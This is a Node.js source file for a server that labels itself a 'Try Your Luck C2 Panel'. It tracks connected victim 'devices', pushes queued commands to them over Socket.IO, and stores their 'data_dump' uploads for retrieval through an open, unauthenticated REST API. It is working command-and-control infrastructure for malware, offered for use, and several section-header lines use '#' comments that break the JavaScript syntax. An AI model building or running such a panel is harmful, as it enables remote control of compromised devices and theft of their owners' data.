const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

// ============================================
# 🚀 INITIALIZE APP
// ============================================

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    transports: ['websocket', 'polling']
});

// ============================================
# 📦 MIDDLEWARE
// ============================================

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));

// ============================================
# 💾 DATA STORAGE
// ============================================

const DATA_DIR = path.join(__dirname, 'data');
const DEVICES_FILE = path.join(DATA_DIR, 'devices.json');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Load devices
let devices = {};
if (fs.existsSync(DEVICES_FILE)) {
    try {
        devices = JSON.parse(fs.readFileSync(DEVICES_FILE, 'utf8'));
    } catch (e) {
        console.error('Error loading devices:', e);
        devices = {};
    }
}

// Save devices function
function saveDevices() {
    try {
        fs.writeFileSync(DEVICES_FILE, JSON.stringify(devices, null, 2));
    } catch (e) {
        console.error('Error saving devices:', e);
    }
}

// Get dump file path
function getDumpFile(deviceId) {
    return path.join(DATA_DIR, `dump_${deviceId}.json`);
}

// Save dump function
function saveDump(deviceId, type, data) {
    try {
        const dumpFile = getDumpFile(deviceId);
        let dumps = [];
        if (fs.existsSync(dumpFile)) {
            dumps = JSON.parse(fs.readFileSync(dumpFile, 'utf8'));
        }
        dumps.push({
            type: type,
            data: data,
            timestamp: new Date().toISOString()
        });
        fs.writeFileSync(dumpFile, JSON.stringify(dumps, null, 2));
    } catch (e) {
        console.error('Error saving dump:', e);
    }
}

// ============================================
# 📡 SOCKET.IO EVENTS
// ============================================

io.on('connection', (socket) => {
    console.log(`🟢 New connection: ${socket.id}`);
    
    // Send current devices list to new client
    socket.emit('devices_update', devices);

    // ==========================================
    # 📱 REGISTER DEVICE
    // ==========================================

    socket.on('register', (data) => {
        try {
            const deviceId = data.deviceId || socket.id;
            
            if (!devices[deviceId]) {
                devices[deviceId] = {
                    id: deviceId,
                    connected: true,
                    firstSeen: new Date().toISOString(),
                    lastSeen: new Date().toISOString(),
                    info: data.info || {},
                    commands: [],
                    socketId: socket.id
                };
            } else {
                devices[deviceId].connected = true;
                devices[deviceId].lastSeen = new Date().toISOString();
                devices[deviceId].socketId = socket.id;
                if (data.info) {
                    devices[deviceId].info = { ...devices[deviceId].info, ...data.info };
                }
            }
            
            socket.deviceId = deviceId;
            saveDevices();
            
            console.log(`📱 Device registered: ${deviceId}`);
            
            io.emit('devices_update', devices);
            io.emit('device_connected', { deviceId, info: devices[deviceId].info });
            
            sendPendingCommands(socket, deviceId);
        } catch (error) {
            console.error('Error registering device:', error);
            socket.emit('error', { message: 'Registration failed' });
        }
    });

    // ==========================================
    # 📤 COMMAND RESPONSE
    // ==========================================

    socket.on('command_response', (data) => {
        try {
            const deviceId = data.deviceId || socket.deviceId;
            console.log(`📥 Response from ${deviceId}:`, data);
            
            if (devices[deviceId]) {
                const commands = devices[deviceId].commands || [];
                const commandIndex = commands.findIndex(c => c.id === data.commandId);
                if (commandIndex !== -1) {
                    commands[commandIndex].status = 'completed';
                    commands[commandIndex].response = data.response;
                    commands[commandIndex].completedAt = new Date().toISOString();
                    devices[deviceId].commands = commands;
                    saveDevices();
                }
            }
            
            io.emit('command_response', {
                deviceId: deviceId,
                command: data.command,
                response: data.response,
                timestamp: new Date().toISOString()
            });
        } catch (error) {
            console.error('Error handling command response:', error);
        }
    });

    // ==========================================
    # 📂 DATA DUMP
    // ==========================================

    socket.on('data_dump', (data) => {
        try {
            const deviceId = data.deviceId || socket.deviceId;
            console.log(`📂 Data dump from ${deviceId}: ${data.type}`);
            
            saveDump(deviceId, data.type, data.payload);
            
            io.emit('data_dump_received', {
                deviceId: deviceId,
                type: data.type,
                data: data.payload,
                timestamp: new Date().toISOString()
            });
            
            if (devices[deviceId]) {
                devices[deviceId].lastSeen = new Date().toISOString();
                saveDevices();
            }
        } catch (error) {
            console.error('Error handling data dump:', error);
            socket.emit('error', { message: 'Data dump failed' });
        }
    });

    // ==========================================
    # ❌ DISCONNECT
    // ==========================================

    socket.on('disconnect', () => {
        try {
            if (socket.deviceId && devices[socket.deviceId]) {
                devices[socket.deviceId].connected = false;
                devices[socket.deviceId].lastSeen = new Date().toISOString();
                saveDevices();
                io.emit('devices_update', devices);
                io.emit('device_disconnected', { deviceId: socket.deviceId });
                console.log(`🔴 Device disconnected: ${socket.deviceId}`);
            }
        } catch (error) {
            console.error('Error handling disconnect:', error);
        }
    });
});

// ============================================
# 🎯 SEND PENDING COMMANDS
// ============================================

function sendPendingCommands(socket, deviceId) {
    try {
        const device = devices[deviceId];
        if (!device) return;
        
        const pending = (device.commands || []).filter(c => 
            c.status === 'pending' || c.status === 'queued'
        );
        
        for (const command of pending) {
            socket.emit('command', command);
            command.status = 'sent';
            command.sentAt = new Date().toISOString();
        }
        
        if (pending.length > 0) {
            saveDevices();
            console.log(`📤 Sent ${pending.length} pending commands to ${deviceId}`);
        }
    } catch (error) {
        console.error('Error sending pending commands:', error);
    }
}

// ============================================
# 🌐 REST API ROUTES
// ============================================

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/api/devices', (req, res) => {
    try {
        res.json(devices);
    } catch (error) {
        console.error('Error getting devices:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/api/device/:id', (req, res) => {
    try {
        const device = devices[req.params.id];
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        res.json(device);
    } catch (error) {
        console.error('Error getting device:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.post('/api/command', (req, res) => {
    try {
        const { deviceId, action, params } = req.body;
        
        if (!deviceId) {
            return res.status(400).json({ error: 'Device ID required' });
        }
        if (!action) {
            return res.status(400).json({ error: 'Action required' });
        }
        if (!devices[deviceId]) {
            return res.status(404).json({ error: 'Device not found' });
        }

        const command = {
            id: `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`,
            action: action,
            params: params || {},
            issued: new Date().toISOString(),
            status: 'pending'
        };

        if (!devices[deviceId].commands) {
            devices[deviceId].commands = [];
        }
        devices[deviceId].commands.push(command);
        saveDevices();

        const socketId = devices[deviceId].socketId;
        let sent = false;
        
        if (socketId) {
            const targetSocket = io.sockets.sockets.get(socketId);
            if (targetSocket && targetSocket.connected) {
                targetSocket.emit('command', command);
                command.status = 'sent';
                command.sentAt = new Date().toISOString();
                saveDevices();
                sent = true;
            }
        }

        res.json({
            success: true,
            command: command,
            status: sent ? 'sent' : 'queued'
        });

    } catch (error) {
        console.error('Error sending command:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/api/logs/:deviceId', (req, res) => {
    try {
        const device = devices[req.params.deviceId];
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        res.json(device.commands || []);
    } catch (error) {
        console.error('Error getting logs:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/api/dumps/:deviceId', (req, res) => {
    try {
        const dumpFile = getDumpFile(req.params.deviceId);
        if (!fs.existsSync(dumpFile)) {
            return res.json([]);
        }
        const dumps = JSON.parse(fs.readFileSync(dumpFile, 'utf8'));
        res.json(dumps);
    } catch (error) {
        console.error('Error getting dumps:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.delete('/api/dumps/:deviceId', (req, res) => {
    try {
        const dumpFile = getDumpFile(req.params.deviceId);
        if (fs.existsSync(dumpFile)) {
            fs.unlinkSync(dumpFile);
        }
        res.json({ success: true });
    } catch (error) {
        console.error('Error deleting dumps:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/api/stats', (req, res) => {
    try {
        const total = Object.keys(devices).length;
        const online = Object.values(devices).filter(d => d.connected).length;
        let commands = 0;
        let dumps = 0;
        
        Object.values(devices).forEach(d => {
            commands += (d.commands || []).length;
        });
        
        const files = fs.readdirSync(DATA_DIR);
        files.forEach(file => {
            if (file.startsWith('dump_')) {
                try {
                    const content = JSON.parse(fs.readFileSync(path.join(DATA_DIR, file), 'utf8'));
                    dumps += content.length;
                } catch (e) {}
            }
        });
        
        res.json({
            totalDevices: total,
            onlineDevices: online,
            totalCommands: commands,
            totalDumps: dumps,
            uptime: process.uptime()
        });
    } catch (error) {
        console.error('Error getting stats:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/api/export/:deviceId', (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const device = devices[deviceId];
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const dumpFile = getDumpFile(deviceId);
        let dumps = [];
        if (fs.existsSync(dumpFile)) {
            dumps = JSON.parse(fs.readFileSync(dumpFile, 'utf8'));
        }
        
        const exportData = {
            device: device,
            dumps: dumps,
            exportedAt: new Date().toISOString()
        };
        
        res.json(exportData);
    } catch (error) {
        console.error('Error exporting data:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================
# 🚀 START SERVER
// ============================================

const PORT = process.env.PORT || 10000;
const HOST = '0.0.0.0';

server.listen(PORT, HOST, () => {
    console.log('='.repeat(50));
    console.log('🖥️  Try Your Luck C2 Panel');
    console.log('='.repeat(50));
    console.log(`📍 Server running on port: ${PORT}`);
    console.log(`📍 URL: http://localhost:${PORT}`);
    console.log(`📱 Waiting for devices to connect...`);
    console.log('='.repeat(50));
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n🛑 Shutting down gracefully...');
    saveDevices();
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
    saveDevices();
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    saveDevices();
});